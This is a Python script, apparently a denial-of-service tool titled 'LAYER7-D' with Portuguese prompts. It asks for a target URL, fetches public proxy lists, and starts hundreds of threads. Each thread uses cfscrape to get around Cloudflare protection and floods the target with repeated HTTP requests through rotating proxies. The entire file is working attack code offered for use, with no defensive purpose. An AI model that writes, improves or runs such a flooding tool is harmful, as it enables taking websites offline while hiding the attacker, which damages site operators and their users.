import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
print(Fore.YELLOW + """  
██╗      █████╗ ██╗   ██╗███████╗██████╗ ███████╗      ██████╗ 
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗╚════██║      ██╔══██╗
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ██╔╝█████╗██║  ██║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗   ██╔╝ ╚════╝██║  ██║
███████╗██║  ██║   ██║   ███████╗██║  ██║   ██║        ██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝        ╚═════╝ 
                                                               
""")
print("by: CKW")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Aguarde alguns segundos para iniciar o ataque.")
	time.sleep(10)
	input(Fore.CYAN + "Digite enter para começar o ataque!")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + "URL : " + Fore.WHITE))
	ssl = str(input(Fore.GREEN + "O site tem SSL? (y/n) : " + Fore.WHITE))
	ge = str(input(Fore.GREEN + "Usar proxies? (y/n) : " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000')
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Lista de proxys HTTPS carregadas!")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000')
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Lista de proxys HTTP carregadas!")
	else:
		pass
	list = str(input(Fore.GREEN + "Nome do arquivo de proxies padrão:(proxies.txt): " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Número de proxies : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Quantidade threads (1-400 Padrão é 300) : " + Fore.WHITE))
	per = int(input(Fore.GREEN + "CC.Power (1-100 Padrão é 70) : " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + "Atacando --->  " + Fore.WHITE + str(url)+ Fore.CYAN + " Proxy~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Atacando --->  " + Fore.WHITE + str(url)+Fore.CYAN + " Proxy~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1]))
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Conexão com a proxy falhou!")


if __name__ == "__main__":
	main()
